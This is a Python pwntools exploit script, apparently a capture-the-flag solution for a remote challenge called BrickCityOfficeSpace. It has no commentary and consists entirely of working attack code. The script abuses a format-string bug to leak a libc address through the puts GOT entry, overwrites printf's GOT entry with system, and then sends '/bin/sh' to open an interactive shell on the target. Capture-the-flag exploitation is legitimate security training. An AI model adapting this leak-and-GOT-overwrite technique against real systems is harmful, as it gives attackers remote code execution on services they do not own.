from pwn import *

context.arch = 'i386'
#p = process('./BrickCityOfficeSpace', env={'LD_PRELOAD' : './libc.so.6'})
p = remote("brick-city-office-space.pwn.ctf.umasscybersec.org", 45001)
e = ELF('./BrickCityOfficeSpace')
libc = ELF('./libc.so.6')
OFFSET = 4
target_got = e.got['puts']
payload = p32(target_got) + f"%{OFFSET}$s".encode()
p.recvuntil(b"BrickCityOfficeSpace> ")
p.sendline(payload)
p.recvuntil(p32(target_got))
leak = u32(p.recvn(4))
libc_base = leak - 0x732a0
log.success(f"Libc Base : {hex(libc_base)}")
p.sendlineafter(b"(y/n)\n", b"y")
system_addr = libc_base + libc.symbols['system']
payload = fmtstr_payload(OFFSET, {e.got['printf'] : system_addr})

p.sendlineafter(b"BrickCityOfficeSpace> ", payload)
p.sendlineafter(b"(y/n)\n", b"y")
p.sendlineafter(b"BrickCityOfficeSpace> ", b"/bin/sh\x00")
p.interactive()